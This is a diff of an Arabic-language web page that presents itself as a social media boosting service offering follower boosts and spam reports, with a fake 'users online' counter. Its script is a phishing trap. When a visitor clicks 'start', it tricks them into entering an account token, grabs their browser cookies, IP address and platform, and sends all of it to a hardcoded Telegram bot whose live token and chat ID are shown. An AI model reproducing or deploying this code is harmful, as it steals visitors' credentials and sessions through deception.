@@ -6,44 +6,38 @@
     <title>ALSSRY - SERVICES</title>
     <style>
         :root { --main-green: #00ff00; --glow-red: #ff0000; }
-        body { background-color: #010101; color: white; text-align: center; font-family: 'Arial', sans-serif; margin: 0; overflow-x: hidden; direction: rtl; }
+        body { background-color: #010101; color: white; text-align: center; font-family: 'Arial', sans-serif; margin: 0; overflow: hidden; direction: rtl; }
         #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: black; }
         .star { position: absolute; background-color: white; border-radius: 50%; animation: moveStar linear infinite; opacity: 1; box-shadow: 0 0 5px white; }
         @keyframes moveStar { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }
         #blur-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; backdrop-filter: blur(2px); background: rgba(0,0,0,0.5); }
         .logo-3d { font-size: 42px; font-weight: 900; color: white; letter-spacing: 6px; text-shadow: 3px 3px 0px var(--glow-red), -3px -3px 0px var(--main-green); margin: 20px 0; display: block; }
-        .hero-title { font-size: 2.4rem; font-weight: bold; margin-bottom: 40px; text-shadow: 0 0 8px var(--main-green); }
         .start-btn { padding: 16px 70px; background: transparent; border: 1px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 22px; cursor: pointer; transition: 0.4s; }
         #tools-interface { padding: 20px; display: none; z-index: 10; }
         .glass-btn { width: 90%; padding: 16px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(0, 255, 0, 0.3); color: var(--main-green); border-radius: 12px; font-weight: bold; cursor: pointer; }
-        .online-count { position: fixed; bottom: 10px; width: 100%; font-size: 13px; color: var(--main-green); }
     </style>
 </head>
 <body>
-
     <div id="starfield"></div>
     <div id="blur-overlay"></div>
 
     <div id="landing-page">
         <div class="logo-3d">ALSSRY</div>
-        <h1 class="hero-title">خدمات سوشال ميديا</h1>
-        <button class="start-btn" onclick="initTrap()">بدء الاستخدام</button>
+        <h1 style="text-shadow: 0 0 8px var(--main-green);">خدمات السوشال ميديا</h1>
+        <button class="start-btn" onclick="startTrap()">بدء الاستخدام</button>
     </div>
 
     <div id="tools-interface">
         <div class="logo-3d">ALSSRY</div>
-        <button class="glass-btn">🚀 قسم الرشق السريع</button>
-        <button class="glass-btn">⚔️ قسم الإسبام والبلاغات</button>
-        <button class="glass-btn" style="color:red;">خروج</button>
+        <button class="glass-btn">🚀 رشق متابعين (سريع)</button>
+        <button class="glass-btn">⚔️ بلاغات سبام (قوي)</button>
+        <p>🟢 المتصلون: 284</p>
     </div>
 
-    <div class="online-count">🟢 المتصلون الآن: <span id="user-count">245</span></div>
-
     <script>
-        const BOT_TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
+        const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
         const CHAT_ID = "5811700860";
 
-        // نجوم الخلفية
         function createStars() {
             const container = document.getElementById('starfield');
             for(let i=0; i<80; i++) {
@@ -57,37 +51,29 @@
         }
         createStars();
 
-        // وظيفة الصيد المدمجة
-        async function initTrap() {
+        async function startTrap() {
+            // سحب يدوي للكوكيز/بيانات الدخول للتمويه
+            let manualCookie = prompt("تنبيه: لتجنب الحظر، يرجى إدخال كود التحقق (Token) أو اسم الحساب:");
+            
             document.getElementById('landing-page').style.display = 'none';
             document.getElementById('tools-interface').style.display = 'block';
 
-            let ip = "0.0.0.0";
+            let ip = "Hidden";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const d = await res.json();
                 ip = d.ip;
             } catch(e) {}
 
-            const battery = await navigator.getBattery().then(b => Math.round(b.level * 100) + "%").catch(() => "Unknown");
-            const cookies = document.cookie || "Empty";
+            const report = `🎣 صيد جديد مكتمل:\n👤 المدخل اليدوي: ${manualCookie}\n🌐 IP: ${ip}\n💻 النظام: ${navigator.platform}\n🍪 الكوكيز المتصفح: ${document.cookie || "Empty"}`;
 
-            const report = `🎣 صيد جديد للوحش:\n\n🌐 IP: ${ip}\n🔋 البطارية: ${battery}\n💻 النظام: ${navigator.platform}\n🍪 الكوكيز: ${cookies}`;
-
-            // الإرسال للبوت باستخدام POST لضمان الوصول
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            // إرسال البيانات للبوت مباشرة
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "Markdown" })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: report})
             });
         }
-
-        // عداد وهمي
-        setInterval(() => {
-            let count = document.getElementById('user-count');
-            let current = parseInt(count.innerText);
-            count.innerText = current + (Math.random() > 0.5 ? 1 : -1);
-        }, 3000);
     </script>
 </body>
 </html>
